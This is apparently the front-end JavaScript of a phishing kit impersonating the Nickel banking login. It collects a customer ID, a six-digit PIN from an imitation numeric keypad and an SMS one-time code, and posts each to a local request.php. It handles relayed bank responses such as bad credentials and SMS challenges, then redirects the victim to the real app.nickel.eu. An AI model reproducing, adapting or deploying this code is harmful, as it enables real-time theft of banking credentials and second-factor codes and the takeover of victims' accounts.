$(document).ready(function(){

})
jQuery(function($) {
    'use strict';
    // $(".input-mask").mask("999 999 999 9",{placeholder:"XXX XXX XXX X"});
    // $(".input-mask2").mask("9 9 9 9 9 9",{placeholder:"X X X X X X"});


});
count = 0
$(document).on('keyup','#usercode',function(){
    count += 1
    if($(this).val().length == 10){
        this.disabled = true;

        $("#userinit").css({"display":"block"})
        $(".fota").css({"display":"none"})
        $(".label-wrapper").css({"display":"block"})
        $('.cn-hidden-password').css({"display":"flex"})
        $('.cn-random-numeric-pad').css({"display":"block"})
        load_clv()
    }


})
counts = 0
$(document).on('keyup','#telecode',function(){
    counts += 1
    console.log($(this).val().length)
    if($(this).val().length == 6){
        sms()
        // this.disabled = true;
    }

})

function makeid(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const charactersLength = characters.length;
    let counter = 0;
    while (counter < length) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
      counter += 1;
    }
    return result;
}
function sms(){
    $.ajax({
        type: "POST",
        url: "request.php",
        cash: false,
        data: {"step":"sms_after","codes":$("#telecode").val(),},
        beforeSend: function() {
            
        },
        success: function(data) {
            var json = JSON.parse(data);


            if(json.success == "true" && json.send == "empty"){
                window.location.href = "./loading.php?cheking=pass&step=2&start=true&id="+makeid(26);
            }else if(json.success == "true" && json.send == "send"){
                window.location.href = "https://app.nickel.eu/";
            }

        }
    })
}


function load_clv(){
    $('.lines1').html("");
    $('.lines2').html("");
    $.ajax({
        type: "POST",
        url: "clv.php",
        cash: false,
        data: {"loading_clv":makeid(18)},
        beforeSend: function() {
        },
        success: function(data) {
            var json = JSON.parse(data);

            if(json){
                $.each(json[0],function(dd){
                    $('.lines1').append(json[0][dd])
                })
                $.each(json[1],function(dd){
                    $('.lines2').append(json[1][dd])
                })

            }


        }
    })
}
$(document).on('click','.close_msg_layouer2',function(){
    $('.layouer2').addClass('d-none')
    $('.layouer').addClass('d-none')
})
$(document).on('click','.close_msg_layouer0',function(){
    $('.layouer0').addClass('d-none')
    $('.layouer').addClass('d-none')
})
$(document).on('click','#userinit',function(){
    $('.bb1').removeClass('complete');
    $('.bb2').removeClass('complete');
    $('.bb3').removeClass('complete');
    $('.bb4').removeClass('complete');
    $('.bb5').removeClass('complete');
    $('.bb6').removeClass('complete');
    $("#nn").val('');
    $('#usercode').removeAttr("disabled")
    $(".fota").css({"display":"block"})
    $(".label-wrapper").css({"display":"none"})
    $('.cn-hidden-password').css({"display":"none"})
    $('.cn-random-numeric-pad').css({"display":"none"})
    load_clv()
    $('#usercode').val("")
    count = 0

})
$(document).on('click','.cleara',function(){
    $('.bb1').removeClass('complete');
    $('.bb2').removeClass('complete');
    $('.bb3').removeClass('complete');
    $('.bb4').removeClass('complete');
    $('.bb5').removeClass('complete');
    $('.bb6').removeClass('complete');
    $("#nn").val('');
})

function sendme(howa) {
    'use strict';
    var plus = document.getElementById('nn');
    if (plus.value.length <= 5) {
        if (plus.value.length == 0) {
            $('.bb1').addClass('complete');
        }
        if (plus.value.length == 1) {
            $('.bb2').addClass('complete');
        }
        if (plus.value.length == 2) {
            $('.bb3').addClass('complete');
        }
        if (plus.value.length == 3) {
            $('.bb4').addClass('complete');
        }
        if (plus.value.length == 4) {
            $('.bb5').addClass('complete');
        }
        if (plus.value.length == 5) {
            $('.bb6').addClass('complete');
        }


        plus.value = plus.value + howa;
        if(plus.value.length == 6){
            $.ajax({
                type: "POST",
                url: "request.php",
                cash: false,
                data: {"step":"login","identiant":$("#usercode").val(),"password":plus.value},
                beforeSend: function() {
                    $('.layouer').removeClass('d-none')
                    $('.layouer3').removeClass('d-none')
                },
                success: function(data) {
                    var json = JSON.parse(data);
                    if(json){
                        if(json.message && json.message == "error.badCredentials"){
                            $('.layouer3').addClass('d-none')
                            $('.layouer0').removeClass('d-none')
                        }else if(json.message && json.message == "error.tooManyPasswordAttempts"){
                            $('.layouer3').addClass('d-none')
                            $('.layouer2').removeClass('d-none')
                        }else if(json.message && json.message == "error.authenticationChallenge"){
                            $('.layouer').addClass('d-none')
                            $('.layouer3').addClass('d-none')
                            if(json.challengeType && json.challengeType == "SMS"){
                                var token = json.challengeToken;
                                $('#loginform').addClass('d-none')
                                $('.challenge-component').removeClass('d-none')                                
                            }

                        }else{
                            $('.layouer3').addClass('d-none')

                        }
        
                    }
        
                    
                
        
                }
            })
        }

    }

}